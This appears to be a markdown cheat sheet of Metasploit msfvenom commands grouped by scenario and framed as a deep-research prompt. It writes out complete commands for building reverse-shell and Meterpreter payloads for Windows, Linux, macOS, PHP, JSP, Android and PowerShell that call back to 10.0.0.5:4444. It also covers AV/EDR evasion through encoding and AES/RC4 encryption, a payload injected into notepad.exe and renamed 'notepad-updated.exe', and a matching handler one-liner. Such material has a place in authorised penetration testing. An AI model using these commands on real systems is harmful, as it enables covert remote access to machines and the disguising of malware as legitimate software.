# msfvenom — command scenarios for deep research

Every msfvenom command form, grouped by scenario. Flags from Metasploit
6.5.10-dev (`help.txt`).

## How to invoke

```text
@deep-research For msfvenom in Metasploit 6.5, which payload/format pair is
most reliable for a constrained Linux target, and what actually survives
modern EDR? Cite Rapid7 docs, source, and independent detection tests; return
exact commands and expected detection.
```

---

## Scenario 1 — inventory what the build supports

| # | Command | How to use |
|---|---------|------------|
| 1 | `msfvenom -l payloads` | All payloads |
| 2 | `msfvenom -l encoders` | Encoders |
| 3 | `msfvenom -l nops` | NOP generators |
| 4 | `msfvenom -l platforms` | Platforms |
| 5 | `msfvenom -l archs` | Architectures |
| 6 | `msfvenom -l encrypt` | Encryption/encoding types |
| 7 | `msfvenom -l formats` | Output formats |
| 8 | `msfvenom -l all` | Everything |
| 9 | `msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options` | Options for one payload |
| 10 | `msfvenom --refresh-cache -l payloads` | Rebuild metadata cache |

**Research questions**
- Which payloads are staged versus stageless by name?
- Do format lists differ by payload/platform?

**Sources**: payload naming docs, source, issues.

**Output**: a shortlist of payload/format pairs valid for the target.

---

## Scenario 2 — payload selection and generation

| # | Command | How to use |
|---|---------|------------|
| 11 | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe` | Staged Windows EXE |
| 12 | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe` | Stageless Windows EXE |
| 13 | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf` | Linux ELF |
| 14 | `msfvenom -p linux/x64/exec CMD=/bin/sh -f raw -o sc.bin` | Raw shellcode |
| 15 | `msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f macho -o shell.macho` | macOS Mach-O |
| 16 | `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.php` | PHP |
| 17 | `msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.py` | Python |
| 18 | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f war -o shell.war` | JSP WAR |
| 19 | `msfvenom -p bash/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.sh` | Bash |
| 20 | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f dll -o shell.dll` | DLL |
| 21 | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f psh -o shell.ps1` | PowerShell |
| 22 | `msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o shell.apk` | Android APK |
| 23 | `msfvenom -p - LHOST=... < custom.bin` | Custom payload from STDIN |
| 24 | `msfvenom -p - < custom.bin -t 60` | STDIN with read timeout |

**Research questions**
- Which payloads are currently broken or deprecated in 6.5?
- File-format requirements (e.g. `war` needs a servlet container)?

**Sources**: payload docs, source modules, issues.

**Output**: one payload per target with a handler match.

---

## Scenario 3 — format and architecture control

| # | Command | How to use |
|---|---------|------------|
| 25 | `msfvenom -p ... -f raw -o out.bin` | Raw binary |
| 26 | `msfvenom -p ... -f c` | C array |
| 27 | `msfvenom -p ... -f python` | Python bytes |
| 28 | `msfvenom -p ... -f hex` | Hex string |
| 29 | `msfvenom -p ... -f base64` | Base64 |
| 30 | `msfvenom -p ... -a x64` | Force architecture |
| 31 | `msfvenom -p ... --platform windows` | Force platform |
| 32 | `msfvenom -p ... -v shellcode` | Custom variable name |
| 33 | `msfvenom -p ... -f exe-service --service-name updater` | Service binary + name |
| 34 | `msfvenom -p ... -f exe --sec-name .data2` | Custom PE section name |

**Research questions**
- Which formats are text-safe for embedding in exploits?
- Does `-a`/`--platform` ever contradict the payload and fail?

**Sources**: format docs, source encoders, issues.

**Output**: a format chosen for its consumer (exploit, script, file).

---

## Scenario 4 — encoding and bad characters

| # | Command | How to use |
|---|---------|------------|
| 35 | `msfvenom -p ... -b '\x00'` | Avoid null bytes |
| 36 | `msfvenom -p ... -b '\x00\x0a\x0d'` | Avoid null/CR/LF |
| 37 | `msfvenom -p ... -e x86/shikata_ga_nai -i 3` | Encode with iterations |
| 38 | `msfvenom -p ... -e x86/shikata_ga_nai -i 10 -f c` | Heavier encoding |
| 39 | `msfvenom -p ... --smallest` | Minimize size |
| 40 | `msfvenom -p ... -n 64` | Prepend 64-byte NOP sled |
| 41 | `msfvenom -p ... -n 128 --pad-nops` | Pad total size with NOPs |
| 42 | `msfvenom -p ... -s 500` | Max payload size |
| 43 | `msfvenom -p ... -s 500 --encoder-space 400` | Max encoded size |
| 44 | `msfvenom -p ... -c extra.bin` | Append extra win32 shellcode |

**Research questions**
- Why encoders no longer evade AV, and what they still do usefully?
- Does `-b` apply before or after encryption?

**Sources**: encoder docs, detection tests, issues.

**Output**: shellcode that fits the exploit's byte and size constraints.

---

## Scenario 5 — encryption and templates

| # | Command | How to use |
|---|---------|------------|
| 45 | `msfvenom -p ... --encrypt aes256 --encrypt-key KEY --encrypt-iv IV -f exe -o enc.exe` | AES-encrypt shellcode |
| 46 | `msfvenom -p ... --encrypt rc4 --encrypt-key KEY -f exe -o enc.exe` | RC4 |
| 47 | `msfvenom -p ... --encrypt base64 -f exe -o enc.exe` | Base64 encoding |
| 48 | `msfvenom -p ... -x notepad.exe -k -f exe -o notepad-updated.exe` | Inject into a template |
| 49 | `msfvenom -p ... -x template.exe -f exe -o out.exe` | Template without `-k` |
| 50 | `msfvenom -p ... -x template.exe -k -f exe-service -o svc.exe` | Service template |

**Research questions**
- Encryption key/IV format expectations and failure modes?
- What breaks when injecting into signed binaries?

**Sources**: encryption docs, source, issues.

**Output**: a template/encryption recipe with a documented limitation.

---

## Scenario 6 — matching handler

| # | Command | How to use |
|---|---------|------------|
| 51 | `msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD ...; set LHOST ...; set LPORT ...; exploit -j -z'` | One-line handler |
| 52 | `msfvenom ... -p windows/x64/meterpreter/reverse_tcp` → handler payload must match exactly | Staged pairing |
| 53 | `msfvenom ... -p windows/x64/meterpreter_reverse_tcp` → handler uses same stageless name | Stageless pairing |

**Research questions**
- Exact payload-name match rules between generator and handler?
- Which transport ports are most likely to egress?

**Sources**: handler docs, network egress studies, issues.

**Output**: a payload + handler pair verified on a lab target.

---

## Complete flag coverage

| Group | Flags | Scenario |
|-------|-------|----------|
| Inventory | `-l`/`--list`, `--list-options`, `--refresh-cache` | 1 |
| Payload | `-p`/`--payload`, `-f`/`--format`, `-o`/`--out` | 2 |
| Platform | `-a`/`--arch`, `--platform` | 3 |
| Encoding | `-e`/`--encoder`, `-i`/`--iterations`, `-b`/`--bad-chars`, `-n`/`--nopsled`, `--pad-nops`, `-s`/`--space`, `--encoder-space`, `-c`/`--add-code`, `--smallest` | 4 |
| Encryption | `--encrypt`, `--encrypt-key`, `--encrypt-iv` | 5 |
| Template | `-x`/`--template`, `-k`/`--keep` | 5 |
| Naming | `-v`/`--var-name`, `--service-name`, `--sec-name` | 3 |
| Input | `-t`/`--timeout` | 2 |
| Misc | `-h`/`--help` | all |

Full per-flag text: [`help.txt`](help.txt).
